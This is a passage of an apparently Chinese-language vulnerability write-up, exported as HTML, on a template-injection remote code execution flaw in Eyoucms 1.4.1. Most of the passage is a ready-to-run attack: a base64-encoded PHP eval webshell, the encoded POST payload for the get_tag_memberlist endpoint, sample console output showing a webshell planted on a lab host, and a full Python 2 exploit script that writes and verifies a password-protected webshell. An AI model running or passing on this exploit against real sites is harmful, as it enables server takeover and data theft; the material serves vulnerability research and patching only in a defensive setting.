class="cs9FB05234">file_put_contents(&quot;./wait.php&quot;,base64_decode(&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==&quot;));</span></p><p class="cs40DD2BC9"><span class="cs8926E06">PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==</span><span class="cs9C1B1871">内容：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php eval($_REQUEST[&ldquo;w&rdquo;]);?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs8926E06">php</span><span class="cs9C1B1871">标签转换为</span><span class="cs8926E06">json</span><span class="cs9C1B1871">格式并加密：</span></p><p class="cs3A447A38"><span class="cs9FB05234">print base64_encode(json_encode(array(&quot;{php}file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));{/php}&quot;=&gt;&quot;{php}file_put_contents(&#39;./wait.php&#39;,base64_decode(\&quot;PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFsidyJdKTs/Pg==\&quot;));{/php}&quot;)));</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=</span></p><p class="cs40DD2BC9"><span class="cs8926E06">pyload:</span></p><p class="cs3A447A38"><span class="cs9FB05234">attarray=eyJ7cGhwfWZpbGVfcHV0X2NvbnRlbnRzKCcuXC93YWl0LnBocCcsYmFzZTY0X2RlY29kZShcIlBEOXdhSEFnWVhOelpYSjBLQ1JmVWtWUlZVVlRWRnNpZHlKZEtUc1wvUGc9PVwiKSk7e1wvcGhwfSI6IntwaHB9ZmlsZV9wdXRfY29udGVudHMoJy5cL3dhaXQucGhwJyxiYXNlNjRfZGVjb2RlKFwiUEQ5d2FIQWdZWE56WlhKMEtDUmZVa1ZSVlVWVFZGc2lkeUpkS1RzXC9QZz09XCIpKTt7XC9waHB9In0=&amp;htmlcode=bb</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Eyoucms/Eyoucms%201.4.1%20%e5%89%8d%e5%8f%b0rce_files/image1.png" width="560" height="287" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">htmlcode</span><span class="cs9C1B1871">参数作为随机方式传递</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">silly@PenetrationOs:~#: python eyoucms-ssti.py -u http://192.168.1.106:8085/ -o abc</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[+] </span><span class="cs7FFD2630">正在请求目标地址</span><span class="cs9FB05234">:http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] </span><span class="cs7FFD2630">目标地址</span><span class="cs9FB05234">http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist</span><span class="cs7FFD2630">存活</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] </span><span class="cs7FFD2630">正在向目标地址</span><span class="cs9FB05234">http://192.168.1.106:8085/?m=api&amp;c=ajax&amp;a=get_tag_memberlist</span><span class="cs7FFD2630">写入</span><span class="cs9FB05234">abc.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] </span><span class="cs7FFD2630">疑似成功写入</span><span class="cs9FB05234">Webshell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] </span><span class="cs7FFD2630">正在探测</span><span class="cs9FB05234">Webshell(http://192.168.1.106:8085/abc.php)</span><span class="cs7FFD2630">是否存活</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Webshell(http://192.168.1.106:8085/abc.php)</span><span class="cs7FFD2630">已存活</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] </span><span class="cs7FFD2630">密码：</span><span class="cs9FB05234">ceshi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*]</span></p><p class="cs3A447A38"><span class="cs9FB05234">python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> -*- coding: UTF-8 -*-</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import sys,getopt</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import json,base64</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">class Eyoucms:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;session = None</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = None</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;password = &quot;ceshi&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;output = &quot;ceshi&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requesturi = &quot;/?m=api&amp;c=ajax&amp;a=get_tag_memberlist&quot;</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __init__(self,headers):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.headers = headers</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getparam(sys.argv[1:])</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.requestsdata = {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;attarray&quot;:self.createpyload(),</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;htmlcode&quot;:time.time()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.run()</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def getparam(self,argv):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;options, args = getopt.getopt(argv, &quot;h:u:p:o:&quot;, [&quot;help&quot;, &quot;url=&quot;,&quot;password=&quot;,&quot;output=&quot;])</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except getopt.GetoptError:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;eyoucms-ssti.py -u url -p password -o outputfile&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for option, value in options:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if option in (&quot;-h&quot;, &quot;--help&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;eyoucms-ssti.py -u url&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if option in (&quot;-u&quot;, &quot;--url&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(self.request(value).status_code != 404):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.url = value</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if option in (&quot;-p&quot;, &quot;--password&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(value != None):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.password = value</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.password = &quot;ceshi&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if option in (&quot;-o&quot;, &quot;--output&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(value != None):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.output = value.replace(&quot;.php&quot;,&quot;&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.output = &quot;ceshi&quot;</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def run(self):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = self.url.rstrip(&#39;/&#39;)+self.requesturi</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] </span><span class="cs7FFD2630">正在请求目标地址</span><span class="cs9FB05234">:%s&quot;%(url)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(self.request(url).status_code == 200):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs7FFD2630">目标地址</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">存活</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] </span><span class="cs7FFD2630">目标地址</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">探测失败</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] </span><span class="cs7FFD2630">正在向目标地址</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">写入</span><span class="cs9FB05234">%s.php&quot;%(url,self.output)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(self.request(url,&quot;post&quot;).status_code == 200):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs7FFD2630">疑似成功写入</span><span class="cs9FB05234">Webshell&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell = self.url.rstrip(&#39;/&#39;)+&quot;/%s.php&quot;%self.output</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] </span><span class="cs7FFD2630">正在探测</span><span class="cs9FB05234">Webshell(%s)</span><span class="cs7FFD2630">是否存活</span><span class="cs9FB05234">&quot;%(shell)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(self.request(shell).status_code == 200):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> Webshell(%s)</span><span class="cs7FFD2630">已存活</span><span class="cs9FB05234">\n</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs7FFD2630">密码：</span><span class="cs9FB05234">%s&quot;%(shell,self.password)</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def createpyload(self):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short = base64.b64encode(&quot;&lt;php eval($_REQUEST[%s]);?&gt;&quot;%self.password)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file = self.output</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;{php}1{/php}&quot;:&quot;{php}file_put_contents(&#39;./%s.php&#39;,base64_decode(&#39;%s&#39;));{/php}&quot;%(file,short)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return base64.b64encode(json.dumps(payload))</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def request(self,url,method=&quot;get&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;respone = None</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(not self.session):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.session = requests.Session()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(method == &quot;get&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;respone = self.session.get(url=url,headers=self.headers)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except requests.exceptions.ConnectTimeout:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] </span><span class="cs7FFD2630">请求</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">超时</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except requests.exceptions.ConnectionError:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] </span><span class="cs7FFD2630">请求</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">无效</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return respone</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif(method == &quot;post&quot;):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;respone = self.session.post(url=url,data=self.requestsdata,headers=self.headers)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except requests.exceptions.ConnectTimeout:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] </span><span class="cs7FFD2630">请求</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">超时</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except requests.exceptions.ConnectionError:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[-] </span><span class="cs7FFD2630">请求</span><span class="cs9FB05234">%s</span><span class="cs7FFD2630">无效</span><span class="cs9FB05234">&quot;%url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return respone</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;,</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Eyoucms(headers)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://bbs.ichunqiu.com/thread-56458-1-1.html</span></p></body>
</html>
